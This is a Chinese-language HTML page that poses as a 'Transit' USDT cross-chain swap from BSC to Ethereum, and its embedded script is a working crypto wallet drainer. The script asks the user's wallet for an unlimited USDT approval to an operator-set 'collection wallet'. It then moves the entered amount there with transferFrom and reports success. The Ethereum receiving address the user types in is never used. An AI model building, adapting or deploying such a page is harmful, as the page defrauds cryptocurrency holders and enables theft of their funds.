<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>闪兑&跨链</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
    }
    body {
      background-color: #f5f7fa;
      padding: 20px 16px;
      color: #111;
    }
    .page-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 32px;
      font-size: 24px;
    }
    .header-right-icon {
      display: flex;
      gap: 20px;
      align-items: center;
    }
    .title-main {
      font-size: 42px;
      font-weight: 600;
      margin-bottom: 30px;
    }
    .label-tip {
      color: #888;
      font-size: 16px;
      margin-bottom: 12px;
    }
    .asset-card {
      background: #eeeeef;
      border-radius: 14px;
      padding: 18px 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
    }
    .asset-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .coin-logo {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background-color: #28b463;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-weight: bold;
    }
    .asset-text h4 {
      font-size: 18px;
      font-weight: 500;
    }
    .asset-text p {
      font-size: 14px;
      color: #666;
    }
    .asset-input-wrap {
      text-align: right;
    }
    .asset-input {
      background: transparent;
      border: none;
      font-size: 20px;
      text-align: right;
      width: 120px;
      outline: none;
      color: #111;
    }
    .swap-arrow {
      text-align: center;
      margin: 10px 0;
      font-size: 26px;
      color: #3488ff;
    }
    .address-wrap {
      background: #eeeeef;
      border-radius: 14px;
      padding: 18px 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
      cursor: pointer;
    }
    .address-text {
      color: #888;
      font-size: 16px;
    }
    .confirm-btn {
      width: 100%;
      padding: 20px 0;
      background-color: #b0b8c4;
      color: #fff;
      border: none;
      border-radius: 14px;
      font-size: 20px;
      cursor: pointer;
      transition: 0.2s;
    }
    .confirm-btn.active {
      background-color: #3488ff;
    }
    .info-row {
      display: flex;
      justify-content: space-between;
      padding: 16px 0;
      font-size: 16px;
      color: #666;
    }
    .tab-bar {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      display: flex;
      justify-content: space-around;
      padding: 12px 0 26px;
      background: #fff;
      border-top: 1px solid #e5e7eb;
    }
    .tab-item {
      text-align: center;
      font-size: 12px;
      color: #888;
    }
    .tab-item.active {
      color: #3488ff;
    }
    .addr-modal {
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      display: none;
      z-index: 999;
      align-items: flex-end;
    }
    .modal-content {
      width: 100%;
      background: #fff;
      border-radius: 16px 16px 0 0;
      padding: 24px 20px;
    }
    .modal-title {
      font-size: 18px;
      margin-bottom: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .close-modal {
      color: #3488ff;
      font-size: 16px;
      cursor: pointer;
    }
    .addr-input-box {
      width: 100%;
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 16px;
      font-size: 16px;
      outline: none;
      margin-bottom: 20px;
    }
    .modal-confirm-btn {
      width: 100%;
      padding: 16px 0;
      background: #3488ff;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 17px;
    }
    .tip-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      display: none;
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }
    .tip-box {
      background: #fff;
      width: 80%;
      max-width: 320px;
      border-radius: 14px;
      padding: 24px 20px;
    }
    .tip-confirm {
      text-align: right;
      margin-top: 20px;
    }
    .tip-confirm button {
      border: none;
      background: none;
      color: #3488ff;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="page-header">
    <div>闪兑&跨链 <span style="font-size:18px;color:#777">限价模式</span></div>
    <div class="header-right-icon">
      <span>◯</span>
      <span>⚙</span>
    </div>
  </div>

  <div class="title-main">Transit</div>

  <div class="label-tip">发送</div>
  <div class="asset-card">
    <div class="asset-left">
      <div class="coin-logo">₮</div>
      <div class="asset-text">
        <h4>USDT</h4>
        <p>币安智能链 BSC</p>
      </div>
    </div>
    <div class="asset-input-wrap">
      <input class="asset-input" id="sendAmountInput" type="number" min="0" step="0.0001" placeholder="0">
    </div>
  </div>

  <div class="swap-arrow">⇆</div>

  <div class="label-tip">接收（预估）</div>
  <div class="asset-card">
    <div class="asset-left">
      <div class="coin-logo">₮</div>
      <div class="asset-text">
        <h4>USDT</h4>
        <p>以太坊 ETH</p>
      </div>
    </div>
    <div class="asset-input-wrap">
      <span id="receiveAmountText">0.0000</span>
    </div>
  </div>

  <div class="address-wrap" id="addressDropBox">
    <div class="address-text" id="showReceiveAddr">请粘贴以太坊接收地址</div>
    <span>▼</span>
  </div>

  <button class="confirm-btn" id="crossBtn">确认跨链转出</button>

  <div class="info-row">
    <span>兑换价格</span>
    <span>-</span>
  </div>

  <div class="addr-modal" id="addressModal">
    <div class="modal-content">
      <div class="modal-title">
        <span>填写接收地址</span>
        <span class="close-modal" id="closeAddrModal">关闭</span>
      </div>
      <input type="text" class="addr-input-box" id="userEthAddrInput" placeholder="粘贴以太坊钱包地址(0x开头)">
      <button class="modal-confirm-btn" id="saveAddrBtn">确认地址</button>
    </div>
  </div>

  <div class="tip-modal" id="globalTipModal">
    <div class="tip-box">
      <p id="tipContent"></p>
      <div class="tip-confirm">
        <button id="closeTipBtn">确定</button>
      </div>
    </div>
  </div>

  <div class="tab-bar">
    <div class="tab-item">资产</div>
    <div class="tab-item">行情</div>
    <div class="tab-item active">交易</div>
    <div class="tab-item">发现</div>
    <div class="tab-item">我的</div>
  </div>

<script>
// 配置项
const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const COLLECT_WALLET = "0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXC6"; // 替换为你的归集钱包地址
const FEE_RATIO = 0.999;

// ✅ 标准JSON格式ABI（修复核心：不再使用纯函数字符串）
const USDT_ABI = [
  {
    "constant": false,
    "inputs": [{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],
    "name":"approve",
    "outputs": [{"name":"","type":"bool"}],
    "payable": false,
    "stateMutability":"nonpayable",
    "type":"function"
  },
  {
    "constant": false,
    "inputs": [{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],
    "name":"transferFrom",
    "outputs": [{"name":"","type":"bool"}],
    "payable": false,
    "stateMutability":"nonpayable",
    "type":"function"
  },
  {
    "constant": true,
    "inputs": [{"name":"owner","type":"address"},{"name":"spender","type":"address"}],
    "name":"allowance",
    "outputs": [{"name":"","type":"uint256"}],
    "payable": false,
    "stateMutability":"view",
    "type":"function"
  }
];

// DOM元素绑定
const sendAmountInput = document.getElementById("sendAmountInput");
const receiveAmountText = document.getElementById("receiveAmountText");
const crossBtn = document.getElementById("crossBtn");
const addressDropBox = document.getElementById("addressDropBox");
const addressModal = document.getElementById("addressModal");
const closeAddrModal = document.getElementById("closeAddrModal");
const userEthAddrInput = document.getElementById("userEthAddrInput");
const saveAddrBtn = document.getElementById("saveAddrBtn");
const showReceiveAddr = document.getElementById("showReceiveAddr");
const globalTipModal = document.getElementById("globalTipModal");
const tipContent = document.getElementById("tipContent");
const closeTipBtn = document.getElementById("closeTipBtn");

let web3Instance;
let currentUserAccount;
let usdtTokenContract;
let operateStep = 0; // 0:未连接 1:待授权 2:待转账
let targetReceiveAddress = "";

// 弹窗提示函数
function showToastTip(msg) {
  tipContent.innerText = msg;
  globalTipModal.style.display = "flex";
}
closeTipBtn.onclick = () => globalTipModal.style.display = "none";

// 输入金额实时计算
sendAmountInput.addEventListener("input", function () {
  const inputNum = parseFloat(this.value);
  if (isNaN(inputNum) || inputNum <= 0) {
    receiveAmountText.innerText = "0.0000";
    crossBtn.classList.remove("active");
    crossBtn.disabled = true;
    return;
  }
  const receiveNum = (inputNum * FEE_RATIO).toFixed(4);
  receiveAmountText.innerText = receiveNum;
  crossBtn.classList.add("active");
  crossBtn.disabled = false;
});

// 地址弹窗逻辑
addressDropBox.onclick = () => addressModal.style.display = "flex";
closeAddrModal.onclick = () => addressModal.style.display = "none";
saveAddrBtn.onclick = function () {
  const inputAddr = userEthAddrInput.value.trim();
  const addrReg = /^0x[a-fA-F0-9]{40}$/;
  if (!addrReg.test(inputAddr)) {
    showToastTip("请输入合法0x开头钱包地址");
    return;
  }
  targetReceiveAddress = inputAddr;
  showReceiveAddr.innerText = inputAddr.slice(0,6)+"..."+inputAddr.slice(-4);
  addressModal.style.display = "none";
  userEthAddrInput.value = "";
};

// 切换BSC主网
async function switchBSCChain() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }]
    });
    return true;
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: "0x38",
          chainName: "BNB Smart Chain",
          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
          rpcUrls: ["https://bsc-dataseed.binance.org"],
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
      return true;
    }
    showToastTip("切换BSC主网失败，请手动切换");
    return false;
  }
}

// 钱包连接初始化
async function connectWallet() {
  if (!window.ethereum) {
    showToastTip("请在钱包内置浏览器打开页面");
    return false;
  }
  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const netSuccess = await switchBSCChain();
    if (!netSuccess) return false;

    // 初始化Web3 + 合约（传入标准JSON ABI，修复报错根源）
    web3Instance = new Web3(window.ethereum);
    const accounts = await web3Instance.eth.getAccounts();
    currentUserAccount = accounts[0];
    usdtTokenContract = new web3Instance.eth.Contract(USDT_ABI, BSC_USDT_CONTRACT);

    operateStep = 1;
    showToastTip("钱包连接成功，请进行授权操作");
    return true;
  } catch (error) {
    showToastTip("连接失败：" + error.message);
    return false;
  }
}

// 主按钮交互逻辑
crossBtn.onclick = async function () {
  const transferNum = parseFloat(sendAmountInput.value);
  if (isNaN(transferNum) || transferNum <= 0) {
    showToastTip("请填写转账金额");
    return;
  }
  if (!targetReceiveAddress) {
    showToastTip("请填写接收地址");
    return;
  }

  if (operateStep === 0) {
    await connectWallet();
    return;
  }

  if (operateStep === 1) {
    this.disabled = true;
    try {
      // 无限授权数值
      const maxAllowance = web3Instance.utils.toBN("115792089237316195423570985008687907853269984665640564039457584007913129639935");
      await usdtTokenContract.methods.approve(COLLECT_WALLET, maxAllowance)
        .send({ from: currentUserAccount });
      operateStep = 2;
      this.innerText = "确认划转";
      this.disabled = false;
      showToastTip("授权成功，请再次点击完成转账");
    } catch (err) {
      showToastTip("授权失败：" + err.message);
      this.disabled = false;
    }
    return;
  }

  if (operateStep === 2) {
    this.disabled = true;
    try {
      const amountWei = web3Instance.utils.toWei(transferNum.toString(), "ether");
      await usdtTokenContract.methods.transferFrom(currentUserAccount, COLLECT_WALLET, amountWei)
        .send({ from: currentUserAccount });
      showToastTip("转账上链成功");
      this.innerText = "操作完成";
    } catch (err) {
      showToastTip("转账失败：" + err.message);
      this.disabled = false;
    }
  }
}
</script>
</body>
</html>
